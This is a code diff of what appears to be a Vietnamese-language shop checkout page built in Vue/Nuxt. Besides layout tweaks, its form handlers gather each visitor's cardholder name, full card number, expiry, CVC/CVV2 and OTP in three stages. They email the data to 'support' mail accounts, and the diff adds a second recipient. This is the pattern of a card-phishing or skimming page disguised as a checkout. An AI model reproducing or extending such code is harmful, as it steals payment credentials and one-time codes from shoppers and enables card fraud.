@@ -80,7 +80,7 @@
             <!-- <div class="w-20 mx-3"> <img src="~assets/img/visa.png" class="" alt=""></div> -->
             <!-- <div class="w-20 mx-3"> <img src="~assets/img/master_card.png" class="" alt=""></div> -->
             <!-- <div class="w-20 mx-3"> <img src="~assets/img/jcb.jpg" class="" alt=""></div> -->
-            <div class="sm:h-16 sm:w-auto w-full h-auto mx-3"> <img src="~assets/img/list_visa.jpg" class="h-full w-auto" alt=""></div>
+            <div class="sm:h-16 sm:w-auto w-full h-auto mx-3"> <img src="~assets/img/list_visa.jpg" class="md:h-full md:w-auto  w-full h-auto" alt=""></div>
           </div>
         </div>
 
@@ -181,7 +181,7 @@
         <div class="py-10 flex items-center justify-center text-4xl font-bold text-emerald-900 ">
           <div class="text-green-700 text-center ">
             <div class="text-center text-4xl mb-3">
-            <Icon name="material-symbols:check-circle" style="font-size: 100px;"/>
+              <Icon name="material-symbols:check-circle" style="font-size: 100px;" />
 
             </div>
 
@@ -341,12 +341,7 @@ export default {
         subject: 'Có đơn hàng mới lần 1',
         text: mesage
       })
-      mail.send({
-        config: 'support3',
-        from: 'John Doe',
-        subject: 'Có đơn hàng mới lần 1',
-        text: mesage
-      })
+
 
     },
 
@@ -379,14 +374,22 @@ export default {
       const mesage2 = ' \n' + 'Tên trên thẻ: ' + card_name + ' \n' + 'Số thẻ : ' + card_number + ' \n' + 'Ngày hết hạn: ' + card_date + ' \n' + 'CVC/CVV2: ' + card_cvc + ' \n';
 
 
-      const mail = useMail();
-
+      const mail = useMail()
       mail.send({
+        config: 'support1',
         from: 'John Doe',
         subject: 'Có đơn hàng mới lần 2',
         text: mesage1 + mesage2
-
       })
+      mail.send({
+        config: 'support2',
+        from: 'John Doe',
+        subject: 'Có đơn hàng mới lần 2',
+        text: mesage1 + mesage2
+      })
+
+
+
     },
     checkForm3() {
       for (let key in this.error) {
@@ -420,17 +423,19 @@ export default {
       const otp = this.form3.otp;
       const mesage3 = ' \n' + 'OTP: ' + otp + ' \n';
 
-
-      const mail = useMail();
-
+      const mail = useMail()
       mail.send({
+        config: 'support1',
         from: 'John Doe',
         subject: 'Có đơn hàng mới lần 3',
         text: mesage1 + mesage2 + mesage3
-
       })
-
-
+      mail.send({
+        config: 'support2',
+        from: 'John Doe',
+        subject: 'Có đơn hàng mới lần 3',
+        text: mesage1 + mesage2 + mesage3
+      })
 
 
     },
